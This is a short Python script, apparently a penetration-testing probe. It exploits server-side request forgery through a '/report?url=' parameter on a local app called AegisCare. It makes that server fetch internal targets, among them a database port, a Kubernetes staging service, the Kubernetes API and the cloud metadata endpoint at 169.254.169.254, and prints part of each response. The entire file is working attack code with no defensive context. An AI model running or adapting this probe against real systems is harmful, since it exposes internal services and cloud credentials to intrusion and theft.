import requests

targets = [
    "http://127.0.0.1:8000/metrics",
    "http://127.0.0.1:5432",
    "http://aegiscare-app.staging.svc.cluster.local:8000/metrics",
    "http://169.254.169.254/latest/meta-data",
    "http://kubernetes.default.svc",
]

for url in targets:
    try:
        print(f"[>] Testing SSRF against {url}")
        r = requests.get(f"http://127.0.0.1:8000/report?url={url}", timeout=3)
        print(f"    ↳ Status: {r.status_code}, Response: {r.text[:200]}...\n")
    except Exception as e:
        print(f"    ↳ Failed: {e}\n")
